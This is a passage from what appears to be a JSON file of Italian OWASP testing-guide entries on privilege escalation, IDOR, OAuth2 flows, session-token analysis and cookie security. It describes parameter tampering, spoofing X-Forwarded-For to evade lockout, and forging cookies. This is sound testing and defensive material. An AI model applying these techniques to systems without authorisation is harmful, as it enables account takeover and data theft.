      "summary": "<h3>Riepilogo</h3><p>Questa sezione descrive la problematica dell’escalation di privilegi tra diversi livelli di accesso. Il tester deve verificare che non sia possibile per un utente modificare i propri privilegi o ruoli in modo da eseguire privilege escalation.</p><p>L’escalation di privilegi si verifica quando un utente ottiene accesso a più risorse/funzionalità di quanto dovrebbe, a causa di un errore nell’applicazione. Il risultato è che l’applicazione esegue azioni con più privilegi di quanto previsto da chi l’ha sviluppata.</p><p>Si parla di escalation verticale quando si accede a risorse di livello superiore (es: privilegi admin), orizzontale quando si accede a risorse di pari livello ma di altri utenti.</p><h3>Obiettivi del test</h3><ul><li>Identificare punti di iniezione legati alla manipolazione dei privilegi</li><li>Eseguire fuzzing o tentativi di bypass delle misure di sicurezza</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Per ogni funzionalità che consente di creare, ricevere o eliminare dati (es: pagamento, aggiunta contatto, invio messaggio, eliminazione utente…), annota la funzione e verifica se è possibile eseguirla anche con privilegi insufficienti.</p><p>Esempio: se un POST su /user/viewOrder.jsp permette a un utente del gruppo grp001 di vedere l’ordine 0001, prova a modificare groupID e orderID per accedere a dati di altri gruppi/utenti.</p><p>Verifica se variabili di profilo/ruolo in POST o hidden field possono essere manipolate (es: profile=SysAdmin).</p><p>Testa anche error message o codici di stato restituiti dal server: modificando valori di risposta, è possibile ottenere escalation?</p><p>Verifica se l’applicazione conta i tentativi falliti di login/autorizzazione solo tramite IP: usa X-Forwarded-For per aggirare il blocco.</p><p>Per escalation verticale, verifica che le funzioni/accessi admin non siano raggiungibili da utenti non privilegiati, anche tramite bypass di URL, encoding o manipolazione di path.</p><h3>Riferimenti</h3><ul><li>Wikipedia - Privilege Escalation</li></ul>",
      "tools": "<h3>Strumenti</h3><ul><li>OWASP ZAP</li></ul>",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-ATHZ-04": {
      "summary": "<h3>Riepilogo</h3><p>Le Insecure Direct Object References (IDOR) si verificano quando un’applicazione fornisce accesso diretto a oggetti basato su input fornito dall’utente. Di conseguenza, un attaccante può bypassare l’autorizzazione e accedere direttamente a risorse nel sistema, ad esempio record di database o file.</p><p>Le IDOR permettono agli attaccanti di modificare i parametri usati come riferimento diretto a un oggetto (es: ID numerici, nomi file, token, ecc.) per accedere a risorse che non dovrebbero essere disponibili, come dati di altri utenti, file di sistema, ecc. Questo accade perché l’applicazione usa l’input dell’utente per recuperare un oggetto senza eseguire sufficienti controlli di autorizzazione.</p><h3>Obiettivi del test</h3><ul><li>Identificare dove possono verificarsi riferimenti diretti a oggetti</li><li>Valutare le misure di access control e la loro vulnerabilità a IDOR</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Per testare questa vulnerabilità il tester deve prima mappare tutte le zone dove l’input utente viene usato per referenziare oggetti (es: righe di database, file, pagine applicative, ecc.). Poi deve modificare il valore dei parametri di riferimento e verificare se è possibile accedere a oggetti appartenenti ad altri utenti o bypassare l’autorizzazione.</p><p>L’approccio migliore è disporre di almeno due utenti di test, ciascuno con accesso a oggetti differenti (acquisti, messaggi privati, ecc.), e utenti con privilegi diversi (es: admin).</p><p>Esempi:</p><pre><code>https://foo.bar/somepage?invoice=12345</code></pre><p>Modifica il parametro invoice con il valore di un’altra fattura: puoi vedere dati che non ti appartengono?</p><pre><code>https://foo.bar/changepassword?user=someuser</code></pre><p>Prova a cambiare la password di un utente diverso dal tuo, modificando il parametro user.</p><pre><code>https://foo.bar/showImage?img=img00011</code></pre><p>Modifica il valore di img per accedere a file di altri utenti.</p><pre><code>https://foo.bar/accessPage?menuitem=12</code></pre><p>Modifica menuitem per accedere a funzionalità che non dovresti poter vedere.</p><p>Testa anche i casi in cui il riferimento all’oggetto è suddiviso tra più parametri.</p><h3>Riferimenti</h3><ul><li>OWASP Top 10 2013-A4-Insecure Direct Object References</li></ul>",
      "tools": "",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-ATHZ-05": {
      "summary": "<h3>Sommario</h3><p>OAuth2.0 (di seguito chiamato OAuth) è un framework di autorizzazione che permette a un client di accedere a risorse per conto dell’utente.</p><p>Per ottenere ciò, OAuth si basa fortemente sui token per la comunicazione tra le varie entità, ognuna con un ruolo diverso:</p><ul><li><b>Resource Owner</b>: l’entità che concede l’accesso a una risorsa, solitamente l’utente stesso</li><li><b>Client</b>: l’applicazione che richiede l’accesso a una risorsa per conto del Resource Owner. Esistono due tipi di client:<ul><li><b>Public</b>: client che non possono proteggere un secret (es. applicazioni frontend come SPA, app mobile, ecc.)</li><li><b>Confidential</b>: client che possono autenticarsi in modo sicuro con l’authorization server mantenendo i segreti registrati (es. servizi backend)</li></ul></li><li><b>Authorization Server</b>: il server che gestisce le informazioni di autorizzazione e concede l’accesso</li><li><b>Resource Server</b>: l’applicazione che espone i contenuti richiesti dal client</li></ul><p>Poiché il compito di OAuth è delegare i diritti di accesso dal proprietario al client, diventa un obiettivo interessante per gli attaccanti; una cattiva implementazione può portare ad accessi non autorizzati alle risorse e alle informazioni degli utenti.</p><p>Per fornire accesso a una client application, OAuth utilizza diversi authorization grant type per generare un access token:</p><ul><li><b>Authorization Code</b>: usato sia da client confidential che public per scambiare un codice di autorizzazione con un access token, ma consigliato solo ai confidential</li><li><b>PKCE (Proof Key for Code Exchange)</b>: estensione dell’Authorization Code grant che migliora la sicurezza per i client public e anche per i confidential</li><li><b>Client Credentials</b>: usato per la comunicazione machine-to-machine, dove il “client” è una macchina che accede alle proprie risorse dal Resource Server</li><li><b>Device Code</b>: usato per dispositivi con capacità di input limitate</li><li><b>Refresh Token</b>: token fornito dall’authorization server per permettere al client di rinnovare gli access token dell’utente una volta scaduti o invalidi; si usa insieme ad altri grant type</li></ul><p>Due flussi saranno deprecati con OAuth2.1 e non è raccomandato usarli:</p><ul><li><b>Implicit Flow*</b>: l’implementazione sicura di PKCE rende questo flusso obsoleto. Prima di PKCE, l’Implicit Flow era usato da applicazioni client-side come SPA grazie a CORS che allentava la same-origin policy. Perché non è consigliato, vedi <a href=\"#\">questa sezione</a>.</li><li><b>Resource Owner Password Credentials</b>: usato per scambiare direttamente le credenziali dell’utente con il client, che poi le invia all’authorization server per ottenere un access token. Per i motivi della deprecazione vedi <a href=\"#\">questa sezione</a>.</li></ul><p>*: L’Implicit Flow in OAuth è deprecato, ma rimane utilizzabile in OpenID Connect (OIDC) per ottenere id_token. Fai attenzione a come viene implementato: se viene usato solo l’endpoint /authorization per ottenere un access token, senza /token, si tratta probabilmente di Implicit Flow. Un esempio è disponibile <a href=\"#\">qui</a>.</p><p>Attenzione: i flussi OAuth sono un argomento complesso e quanto sopra rappresenta solo un riepilogo dei punti chiave. I riferimenti inline contengono ulteriori informazioni specifiche sui vari flussi.</p><h3>Obiettivi del Test</h3><ul><li>Verificare se l’implementazione OAuth2 è vulnerabile o utilizza grant type deprecati o custom.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>I grant type deprecati sono stati superati per motivi di sicurezza e funzionalità. Individuare se sono ancora in uso permette di capire rapidamente se sono presenti minacce specifiche legate a tali flussi. Alcuni aspetti potrebbero non essere alla portata dell’attaccante, ad esempio il modo in cui un client utilizza le credenziali dell’utente: questi dettagli andrebbero comunque documentati e segnalati ai team di sviluppo interni.</p><p>Per i client public, di solito è possibile identificare il grant type nella richiesta all’endpoint /token, tramite il parametro grant_type.</p><p>Esempio di Authorization Code grant con PKCE:</p><pre><code>POST /oauth/token HTTP/1.1\nHost: as.example.com\nContent-Type: application/json\n{\n  \"client_id\": \"example-client\",\n  \"code_verifier\": \"example\",\n  \"grant_type\": \"authorization_code\",\n  \"code\": \"example\",\n  \"redirect_uri\": \"https://client.example.com\"\n}</code></pre><p>I valori del parametro grant_type e il grant type corrispondente sono:</p><ul><li>password: indica ROPC</li><li>client_credentials: indica Client Credential grant</li><li>authorization_code: indica Authorization Code grant</li></ul><p>L’Implicit Flow non è identificato dal parametro grant_type ma tramite response_type, perché il token è restituito direttamente nella risposta dell’endpoint /authorization. Esempio:</p><pre><code>GET /authorize\n  ?client_id=&lt;some_client_id&gt;\n  &response_type=token\n  &redirect_uri=https%3A%2F%2Fclient.example.com%2F\n  &scope=openid%20profile%20email\n  &state=&lt;random_state&gt;</code></pre><p>I seguenti parametri indicano il flusso OAuth utilizzato:</p><ul><li>response_type=token: indica Implicit Flow (il client chiede direttamente un token)</li><li>response_type=code: indica Authorization Code Flow (il client richiede un codice da scambiare con il token)</li><li>code_challenge=sha256(xyz): indica l’estensione PKCE (nessun altro flusso lo usa)</li></ul><p>Esempio di richiesta per Authorization Code Flow con PKCE:</p><pre><code>GET /authorize\n    ?redirect_uri=https%3A%2F%2Fclient.example.com%2F\n    &client_id=&lt;some_client_id&gt;\n    &scope=openid%20profile%20email\n    &response_type=code\n    &response_mode=query\n    &state=&lt;random_state&gt;\n    &nonce=&lt;random_nonce&gt;\n    &code_challenge=&lt;random_code_challenge&gt;\n    &code_challenge_method=S256 HTTP/1.1\nHost: as.example.com\n[...]</code></pre><p>L’Authorization Code grant con PKCE è raccomandato per i client public. La richiesta dovrebbe includere response_type=code e code_challenge=sha256(xyz). Lo scambio token deve contenere grant_type=authorization_code e un code_verifier.</p><p>Grant type inappropriati per client public sono:</p><ul><li>Authorization Code grant senza PKCE</li><li>Client Credentials</li><li>Implicit Flow</li><li>ROPC</li></ul><p>L’Authorization Code grant è consigliato per i client confidential (può usare anche PKCE). Grant type inappropriati per client confidential:</p><ul><li>Client Credentials (eccetto per machine-to-machine)</li><li>Implicit Flow</li><li>ROPC</li></ul><p>Se non c’è interazione utente e i client sono solo confidential, si può usare Client Credentials grant. Se si conoscono client_id e client_secret si può ottenere un token con client_credentials:</p><pre><code>$ curl --request POST \\\n  --url https://as.example.com/oauth/token \\\n  --header 'content-type: application/json' \\\n  --data '{\"client_id\":\"&lt;some_client_id&gt;\",\"client_secret\":\"&lt;some_client_secret&gt;\",\"grant_type\":\"client_credentials\"}' --proxy https://localhost:8080/ -k</code></pre><p>Nei vari flussi OAuth vengono trasportate diverse credenziali anche come parametri URL:</p><ul><li>access token</li><li>refresh token</li><li>authorization code</li><li>PKCE code challenge / code verifier</li></ul><p>L’authorization code, code_challenge e code_verifier possono comparire nell’URL. L’Implicit Flow trasporta il token nell’URL se response_mode non è form_post, rischiando leak nei referrer HTTP, log file e proxy.</p><p>Il rischio maggiore deriva dall’Implicit Flow che espone direttamente i token, più facilmente riutilizzabili rispetto ai code_*.</p><p>Per testare questo scenario usa un proxy HTTP come ZAP e intercetta il traffico OAuth:</p><ul><li>Segui tutto il processo di autorizzazione e identifica eventuali credenziali nell’URL.</li><li>Se sono incluse risorse esterne nelle pagine coinvolte, analizza le richieste fatte: i token potrebbero essere inviati nel referrer header.</li></ul><p>Esamina lo storico richieste del proxy cercando header HTTP referer (es: Referer: https://idp.example.com/) contenenti l’URL dell’authorization server o del client.</p><p>Può essere utile controllare anche i meta tag HTML (non sempre supportati dai browser) o la Referrer-Policy per valutare possibili leak di credenziali tramite referrer.</p><h3>Casi di test correlati</h3><ul><li>Testing JSON Web Tokens</li></ul>",
      "tools": "<h3>Strumenti</h3><ul><li>BurpSuite</li><li>EsPReSSO</li><li>ZAP</li></ul><h3>Riferimenti</h3><ul><li>User Authentication with OAuth 2.0</li><li>The OAuth 2.0 Authorization Framework</li><li>The OAuth 2.0 Authorization Framework: Bearer Token Usage</li><li>OAuth 2.0 Threat Model and Security Considerations</li><li>OAuth 2.0 Security Best Current Practice</li><li>Authorization Code Flow with Proof Key for Code Exchange</li></ul>",
      "remediation": "<h3>Remediation</h3><ul><li>Quando implementi OAuth, considera sempre la tecnologia utilizzata e se l’applicazione è lato server (in grado di non esporre i secret) o lato client (che non può proteggerli).</li><li>Quasi sempre, usa Authorization Code Flow con PKCE, tranne che per scenari machine-to-machine.</li><li>Trasporta i secret tramite parametri POST o header HTTP.</li><li>Quando non esistono alternative (es. in applicazioni legacy non migrabili), applica header di sicurezza aggiuntivi come Referrer-Policy.</li></ul>",
      "test_objectives": ""
    },
    "WSTG-SESS-01": {
      "summary": "<h3>Sommario</h3><p>Uno degli elementi fondamentali di qualsiasi applicazione web-based è il meccanismo con cui viene gestito e mantenuto lo stato di un utente che interagisce con essa. Per evitare che l’utente debba autenticarsi a ogni pagina, le web application implementano diversi sistemi per memorizzare e validare le credenziali per un certo periodo di tempo. Questi meccanismi sono detti Session Management.</p><p>In questo test, l’obiettivo è verificare che i cookie e gli altri session token vengano creati in modo sicuro e non prevedibile. Un attacker che riesce a prevedere o forgiare un cookie debole può facilmente prendere il controllo delle sessioni degli utenti legittimi.</p><p>I cookie vengono utilizzati per gestire la sessione e sono descritti in dettaglio nella RFC 2965. In sintesi, quando un utente accede a un’applicazione che deve tracciare le sue azioni e la sua identità su più richieste, il server genera uno o più cookie e li invia al client. Il client restituirà il cookie al server in tutte le connessioni successive, fino alla scadenza o alla distruzione del cookie. I dati memorizzati nel cookie possono fornire al server molte informazioni: chi è l’utente, quali azioni ha fatto, le sue preferenze, ecc., dando così uno stato a un protocollo stateless come HTTP.</p><p>Un esempio tipico è quello di un carrello di uno shop online: durante la sessione, l’applicazione deve tenere traccia dell’identità dell’utente, del profilo, dei prodotti scelti, quantità, prezzi singoli, sconti, ecc. I cookie sono un modo efficiente per memorizzare e scambiare queste informazioni (altri metodi sono parametri URL e campi hidden).</p><p>Vista l’importanza dei dati che custodiscono, i cookie sono quindi fondamentali per la sicurezza complessiva dell’applicazione. Poter manipolare i cookie può significare effettuare hijacking delle sessioni di altri utenti, ottenere privilegi superiori in una sessione attiva, o influenzare il funzionamento dell’applicazione in modo non autorizzato.</p><p>In questo test si verifica se i cookie rilasciati ai client resistono a una vasta gamma di attacchi contro la gestione delle sessioni degli utenti e dell’applicazione stessa. L’obiettivo finale è riuscire a forgiare un cookie che venga accettato come valido dall’applicazione e dia accesso non autorizzato (session hijacking, privilege escalation, ...).</p><p>Solitamente le fasi dell’attacco sono:</p><ul><li>raccolta dei cookie: raccolta di un numero sufficiente di cookie di esempio;</li><li>reverse engineering dei cookie: analisi dell’algoritmo di generazione dei cookie;</li><li>manipolazione del cookie: creazione di un cookie valido per effettuare l’attacco (questa fase può richiedere molti tentativi, a seconda di come viene generato il cookie, come negli attacchi di brute-force).</li></ul><p>Un altro pattern di attacco è l’overflow del cookie. In questo caso il tester non cerca di ricreare un cookie valido, ma di sovrascrivere aree di memoria per alterare il comportamento dell’applicazione e potenzialmente iniettare/eseguire codice malevolo da remoto.</p><h3>Obiettivi del test</h3><ul><li>Raccogliere session token, sia per lo stesso utente che per utenti diversi (se possibile).</li><li>Analizzare e verificare che ci sia abbastanza casualità da prevenire attacchi di session forging.</li><li>Modificare i cookie non firmati e che contengono informazioni manipolabili.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Tutte le interazioni tra client e applicazione dovrebbero essere testate almeno rispetto ai seguenti criteri:</p><ul><li>Tutte le direttive Set-Cookie sono marcate come Secure?</li><li>Qualche operazione sui Cookie avviene su un canale non cifrato?</li><li>È possibile forzare il Cookie su un canale non cifrato?</li><li>Se sì, come garantisce la sicurezza l’applicazione?</li><li>Ci sono Cookie persistenti?</li><li>Che tempi di Expire sono usati sui cookie persistenti, e sono ragionevoli?</li><li>I cookie che dovrebbero essere temporanei sono configurati come tali?</li><li>Che impostazioni HTTP/1.1 Cache-Control vengono usate per proteggere i Cookie?</li><li>Che impostazioni HTTP/1.0 Cache-Control vengono usate?</li></ul><p>Il primo passo per manipolare i cookie è capire come l’applicazione li genera e li gestisce. I tester devono rispondere a queste domande:</p><ul><li>Quanti cookie usa l’applicazione? Navigare l’applicazione e annotare quando vengono creati cookie. Stilare una lista dei cookie ricevuti, la pagina che li imposta (con set-cookie), il dominio di validità, il valore e le caratteristiche.</li><li>Quali parti dell’applicazione generano o modificano il cookie? Navigando l’applicazione, capire quali cookie restano invariati e quali cambiano. Quali eventi modificano il cookie?</li><li>Quali parti dell’applicazione richiedono quel cookie per funzionare? Accedere a una pagina, poi riprovare senza il cookie o con un valore modificato. Mappare l’utilizzo dei cookie.</li></ul><p>Un foglio di calcolo che associa ogni cookie alle parti di applicazione e alle relative informazioni può essere un output molto utile.</p><p>I session token (Cookie, SessionID o Hidden Field) vanno analizzati per verificarne la qualità dal punto di vista della sicurezza: casualità, unicità, resistenza ad analisi statistiche o crittografiche e assenza di informazioni sensibili leggibili.</p><ul><li>Struttura del token e leakage di informazioni</li></ul><p>La prima fase consiste nell’analizzare la struttura e il contenuto di un Session ID fornito dall’applicazione. Un errore frequente è includere dati specifici nel token anziché rilasciare un valore generico e mantenere i dati reali lato server.</p><p>Se il Session ID è in chiaro, la struttura e i dati saranno subito evidenti (es: 192.168.100.1:owaspuser:password:15:58).</p><p>Se tutto o parte del token sembra codificato o hashato, confrontare con vari formati per scoprire eventuali tecniche di offuscamento. Ad esempio la stringa 192.168.100.1:owaspuser:password:15:58 può essere rappresentata in hex, base64, o come hash MD5:</p><ul><li>Hex: 3139322E3136382E3130302E313A6F77617370757365723A70617373776F72643A31353A3538</li><li>Base64: MTkyLjE2OC4xMDAuMTpvd2FzcHVzZXI6cGFzc3dvcmQ6MTU6NTg=</li><li>MD5: 01c2fc4f0a817afd8366689bd29dd40a</li></ul><p>Individuando il tipo di offuscamento, potrebbe essere possibile decodificare i dati originali. Anche se spesso non è semplice, può essere utile riconoscere il tipo di codifica in uso. Se si capiscono sia il formato che la tecnica di offuscamento, è possibile automatizzare attacchi di brute-force.</p><p>I token ibridi possono includere info come IP o User ID insieme a una parte codificata (es: owaspuser:192.168.100.1:a7656fafe94dae72b1e1487670148412).</p><p>Una volta analizzato un singolo token, è necessario esaminare un campione rappresentativo. Un’analisi semplice può rivelare pattern evidenti: ad esempio, un token a 32 bit con 16 bit fissi e 16 variabili può suggerire che la prima parte rappresenta un attributo fisso dell’utente (es: username o IP) e la seconda un elemento incrementale o time-based. Vedi esempi.</p><p>Se vengono individuati elementi statici nei token, raccogliere altri sample variando un input alla volta (es: login con utente/IP diversi può modificare parti statiche del token).</p><p>I seguenti aspetti vanno considerati testando la struttura di Session ID singoli e multipli:</p><ul><li>Quali parti del Session ID sono statiche?</li><li>Quali informazioni sensibili in chiaro sono presenti nel Session ID? (es: username, UID, IP)</li><li>Quali informazioni facilmente decodificabili sono presenti?</li><li>Cosa si può dedurre dalla struttura del Session ID?</li><li>Quali porzioni del Session ID sono statiche a parità di condizioni di login?</li><li>Ci sono pattern evidenti nel Session ID o sue parti?</li></ul><p>L’analisi delle parti variabili del Session ID serve a scoprire pattern riconoscibili o prevedibili, anche tramite strumenti statistici o di cryptanalysis. È utile confrontare i Session ID generati per login con le stesse credenziali (stesso utente, password, IP).</p><p>Il fattore tempo è fondamentale: bisogna raccogliere molti token nello stesso intervallo temporale per scoprire eventuali componenti time-based. Anche 50ms possono nascondere pattern legati al tempo nella generazione del token.</p><p>Le parti variabili vanno analizzate nel tempo per capire se sono incrementali. Se sì, va studiato il pattern legato al tempo assoluto o trascorso. Molti sistemi usano il tempo come seed per elementi pseudo-random. I risultati di hash crittografici appaiono tipicamente come numeri decimali o esadecimali e dovrebbero essere identificabili.</p><p>Nell’analizzare le sequenze dei Session ID, vanno considerati pattern, cicli, elementi statici e dipendenze dal client come possibili fattori strutturali.</p><ul><li>I Session ID sono effettivamente casuali? È possibile riprodurre gli stessi valori?</li><li>Le stesse condizioni di input generano lo stesso ID in run successivi?</li><li>I Session ID resistono a statistiche o cryptanalysis?</li><li>Quali elementi dei Session ID sono legati al tempo?</li><li>Quali parti sono prevedibili?</li><li>È possibile dedurre il prossimo ID conoscendo l’algoritmo e i token precedenti?</li></ul><p>Ora che il tester ha enumerato i cookie e ne conosce l’uso, può analizzare quelli più interessanti. Un cookie sicuro deve possedere diverse caratteristiche, ciascuna mirata a difendere da classi diverse di attacchi.</p><p>In pratica, si raccolgono un numero sufficiente di istanze di cookie e si cercano pattern nei valori. Il numero di sample varia: pochi se il metodo è debole, migliaia se servono analisi statistiche (es: chi-quadro, attractors).</p><p>Attenzione al workflow: uno stato di sessione può influenzare pesantemente il valore del cookie. Un cookie prima dell’autenticazione può essere molto diverso da uno dopo.</p><p>Un altro fattore è il tempo: va sempre annotato quando viene acquisito un cookie, se il server può usare un timestamp nel valore. Annotare l’ora locale o il timestamp del server (presente nella risposta HTTP).</p><p>Analizzando i valori raccolti, il tester deve identificare tutte le variabili che possono influenzare il valore del cookie e variarle una alla volta. Inviare al server versioni modificate aiuta a capire come vengono processati.</p><p>Esempi di controlli da fare a questo punto:</p><ul><li>Quale charset usa il cookie? È numerico, alfanumerico, esadecimale? Cosa succede se si inseriscono caratteri fuori charset?</li><li>Il cookie è composto da più sotto-parti con informazioni diverse? Come sono separati? Quali delimitatori sono usati? Alcune parti possono essere molto variabili, altre fisse, altre con valori limitati. Scomporre il cookie nei suoi componenti di base è il primo passo.</li></ul><p>Esempio di cookie strutturato facilmente riconoscibile:</p><pre><code>ID=5a0acfc7ffeb919:CR=1:TM=1120514521:LM=1120514521:S=j3am5KzC4v01ba3q</code></pre><p>Questo esempio mostra 5 campi diversi con dati differenti:</p><ul><li>ID – esadecimale</li><li>CR – intero piccolo</li><li>TM e LM – interi grandi (e curiosamente uguali, interessante vedere cosa succede modificandone uno)</li><li>S – alfanumerico</li></ul><p>Anche senza delimitatori, con abbastanza sample si può ricavare la struttura.</p><p>Gli attacchi brute-force sono direttamente collegati alla prevedibilità e alla variabilità dei Session ID. Se la variazione dei token è bassa e la sessione dura molto, il brute-force sarà più semplice.</p><p>Un Session ID lungo e con elevata variabilità, abbinato a una durata breve, rende più difficile l’attacco brute-force.</p><ul><li>Quanto tempo richiederebbe un attacco brute-force su tutti i possibili Session ID?</li><li>Lo spazio dei Session ID è sufficientemente grande rispetto alla durata di validità?</li><li>Delay tra tentativi di connessione con diversi Session ID mitigano il rischio di brute-force?</li></ul><p>Se il tester ha accesso allo schema di gestione delle sessioni, può verificare:</p><ul><li><b>Random Session Token</b>: il Session ID o Cookie non deve essere facilmente prevedibile (non usare algoritmi lineari su variabili prevedibili come l’IP). Si consiglia l’uso di algoritmi crittografici con chiave di almeno 256 bit (es. AES).</li><li><b>Lunghezza del token</b>: Session ID di almeno 50 caratteri.</li><li><b>Session Time-out</b>: il token di sessione deve avere una scadenza definita (in base alla criticità dei dati gestiti).</li><li><b>Configurazione cookie</b>:<ul><li>non persistente: solo in RAM</li><li>secure (solo su canale HTTPS): Set-Cookie: cookie=data; path=/; domain=.aaa.it; secure</li><li>HTTPOnly (non leggibile da script): Set-Cookie: cookie=data; path=/; domain=.aaa.it; HttpOnly</li></ul></li></ul><p>Per approfondimenti: Testing for cookies attributes</p>",
      "tools": "<h3>Strumenti</h3><ul><li>Zed Attack Proxy Project (ZAP) – include meccanismi per l’analisi dei session token.</li><li>Burp Sequencer</li><li>YEHG’s JHijack</li></ul><h3>Riferimenti</h3><ul><li>RFC 2965 “HTTP State Management Mechanism”</li><li>RFC 1750 “Randomness Recommendations for Security”</li><li>Michal Zalewski: “Strange Attractors and TCP/IP Sequence Number Analysis” (2001)</li><li>Michal Zalewski: “Strange Attractors and TCP/IP Sequence Number Analysis - One Year Later” (2002)</li><li>Correlation Coefficient</li><li>ENT</li><li>DMA 2005-0614a - Global Hauri ViRobot Server cookie overflow</li><li>OWASP Code Review Guide</li></ul>",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-SESS-02": {
      "summary": "<h3>Sommario</h3><p>I Web Cookie (di seguito semplicemente cookie) rappresentano spesso un vettore di attacco chiave per utenti malevoli (tipicamente contro altri utenti), e l’applicazione dovrebbe sempre adottare tutte le precauzioni necessarie per proteggerli.</p><p>HTTP è un protocollo stateless, cioè non mantiene riferimenti alle richieste inviate dallo stesso utente. Per risolvere questo problema, sono state introdotte le sessioni, associate alle richieste HTTP. I browser, come descritto nella sezione dedicata allo storage del browser, offrono diversi meccanismi di memorizzazione; in quella sezione della guida ciascuno è descritto dettagliatamente.</p><p>Il meccanismo di storage delle sessioni più utilizzato nei browser è il cookie storage. I cookie possono essere impostati dal server, tramite l’header Set-Cookie nella risposta HTTP, oppure via JavaScript. I cookie possono essere usati per molteplici motivi:</p><ul><li>session management</li><li>personalizzazione</li><li>tracking</li></ul><p>Per mettere in sicurezza i dati dei cookie, l’industria ha sviluppato metodi per “blindare” questi cookie e limitarne la superficie di attacco. Nel tempo, i cookie sono diventati il meccanismo di storage preferito dalle web application, grazie alla loro flessibilità d’uso e possibilità di protezione.</p><p>I principali strumenti per proteggere i cookie sono:</p><ul><li>Attributi dei cookie</li><li>Prefissi dei cookie</li></ul><h3>Obiettivi del test</h3><ul><li>Verificare che i cookie siano configurati con le opportune impostazioni di sicurezza.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Di seguito viene descritta ogni attributo e prefisso dei cookie. Il tester deve validare che siano utilizzati correttamente dall’applicazione. I cookie possono essere esaminati tramite un proxy di intercettazione oppure tramite il cookie jar del browser.</p><p>L’attributo Secure indica al browser di inviare il cookie solo se la richiesta avviene su un canale sicuro come HTTPS. Questo aiuta a proteggere il cookie dal rischio di essere inviato in chiaro. Se l’applicazione è accessibile sia su HTTP che su HTTPS, un attacker potrebbe forzare l’utente a inviare i cookie tramite richieste non protette.</p><p>L’attributo HttpOnly serve a prevenire attacchi come session leakage, impedendo l’accesso al cookie tramite script lato client come JavaScript.</p><p>Questo non elimina del tutto la superficie di attacco di un XSS, poiché un attacker potrebbe comunque inviare richieste al posto dell’utente, ma limita notevolmente il rischio di esfiltrazione tramite vettori XSS.</p><p>L’attributo Domain viene usato per confrontare il dominio del cookie con quello del server per cui si effettua la richiesta HTTP. Se il dominio corrisponde o è un suo sottodominio, viene verificato l’attributo path.</p><p>Nota: solo gli host appartenenti al dominio specificato possono impostare un cookie per quel dominio. Inoltre, il dominio non può essere un top-level domain (ad esempio .gov o .com), per impedire di impostare cookie arbitrari su altri domini (come owasp.org). Se l’attributo domain non è impostato, il valore predefinito sarà l’hostname del server che ha generato il cookie.</p><p>Ad esempio, se un cookie è impostato da app.mydomain.com senza il dominio valorizzato, il cookie verrà reinviato solo alle richieste per app.mydomain.com, ma non ai suoi sottodomini (es. hacker.app.mydomain.com) o altri (es. otherapp.mydomain.com). Tuttavia, alcune vecchie versioni di Edge/IE si comportano diversamente e inviano questi cookie anche ai sottodomini. Se si vuole allargare questa restrizione, si può impostare domain=mydomain.com, in tal caso il cookie verrà inviato a tutte le richieste per app.mydomain.com, ai sottodomini come hacker.app.mydomain.com, ed anche a bank.mydomain.com. Se ci fosse un server vulnerabile su un sottodominio e il domain impostato troppo ampio, il server vulnerabile potrebbe intercettare cookie (es. session token) su tutto mydomain.com.</p><p>L’attributo Path definisce, insieme al dominio, l’ambito di validità dei cookie. Oltre al dominio, si può specificare il path URL per cui il cookie è valido. Se dominio e path corrispondono, il cookie viene inviato nella richiesta. Se il path è troppo ampio (es. /), il cookie sarà inviato a tutte le applicazioni presenti sotto lo stesso dominio. Esempi di path con più applicazioni:</p><ul><li>path=/bank</li><li>path=/private</li><li>path=/docs</li><li>path=/docs/admin</li></ul><p>L’attributo Expires serve per:</p><ul><li>impostare cookie persistenti</li><li>limitare la durata della sessione</li><li>forzare la cancellazione di un cookie (impostando una data nel passato)</li></ul><p>A differenza dei session cookie, i cookie persistenti saranno mantenuti dal browser fino alla scadenza. Dopo la data di expire, il browser eliminerà il cookie.</p><p>L’attributo SameSite può essere usato per stabilire se un cookie debba essere inviato anche in richieste cross-site. Questa feature aiuta il server a mitigare i rischi di cross-origin information leakage. Può essere utilizzata anche per ridurre il rischio di CSRF. SameSite può essere impostato in tre modalità:</p><ul><li>Strict</li><li>Lax</li><li>None</li></ul><p>Strict è la modalità più restrittiva: il cookie sarà inviato solo in contesto first-party, senza navigazione top-level. Quindi il cookie verrà inviato solo per richieste che corrispondono al sito visualizzato nella barra degli URL del browser e non su richieste generate da siti terzi. È particolarmente raccomandata per azioni critiche sullo stesso dominio, ma può rendere meno fluida la navigazione su alcune webapp con sistemi di session management complessi.</p><p>Lax è meno restrittivo: il cookie viene inviato se l’URL corrisponde al dominio (first-party) anche se il link arriva da un dominio terzo. È la modalità predefinita nella maggior parte dei browser, perché offre un buon compromesso tra sicurezza e usabilità. Non viene usato per asset come immagini.</p><p>None indica che il cookie sarà inviato in tutti i contesti, incluse richieste cross-site (comportamento normale prima dell’introduzione di SameSite). Se si imposta SameSite=None, deve essere presente anche l’attributo Secure, altrimenti i browser moderni ignorano SameSite (es. SameSite=None; Secure).</p><p>Di base i cookie non garantiscono integrità e confidenzialità dei dati memorizzati. Questa limitazione impedisce al server di essere certo di come siano stati impostati gli attributi di un cookie. Per risolvere il problema, sono stati introdotti i prefissi nel nome dei cookie.</p><p>Il prefisso __Host- richiede che i cookie rispettino le seguenti condizioni:</p><p>Per questo motivo, il cookie Set-Cookie: __Host-SID=12345; Secure; Path=/ sarebbe accettato, mentre i seguenti verrebbero sempre rifiutati: Set-Cookie: __Host-SID=12345 Set-Cookie: __Host-SID=12345; Secure Set-Cookie: __Host-SID=12345; Domain=site.example Set-Cookie: __Host-SID=12345; Domain=site.example; Path=/ Set-Cookie: __Host-SID=12345; Secure; Domain=site.example; Path=/</p><p>Il prefisso __Secure- è meno restrittivo e si imposta aggiungendo la stringa case-sensitive __Secure- al nome del cookie. Ogni cookie con questo prefisso dovrebbe rispettare le seguenti condizioni:</p><p>In base alle necessità dell’applicazione e a come dovrà funzionare il cookie, attributi e prefissi devono essere applicati correttamente. Più il cookie è protetto, meglio è.</p><p>Combinando tutte queste misure, la configurazione più sicura possibile sarà: Set-Cookie: __Host-SID=&lt;session token&gt;; path=/; Secure; HttpOnly; SameSite=Strict.</p>",
